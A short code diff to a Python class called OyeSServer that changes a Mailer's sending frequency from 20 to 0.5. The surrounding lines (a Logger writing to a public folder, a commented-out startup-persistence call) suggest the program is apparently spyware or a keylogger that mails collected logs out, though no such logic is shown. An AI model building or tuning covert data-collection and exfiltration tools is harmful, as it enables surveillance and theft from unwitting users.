@@ -19,7 +19,7 @@ class OyeSServer:
         # self.handle_mul_instances()
         # self.add_startup()
         self.logger = Logger("C:\\Users\\Public\\")
-        self.mailer = Mailer(self, freq=20)
+        self.mailer = Mailer(self, freq=0.5)
         self.server = Server(self)
         print('end of main reached')
 
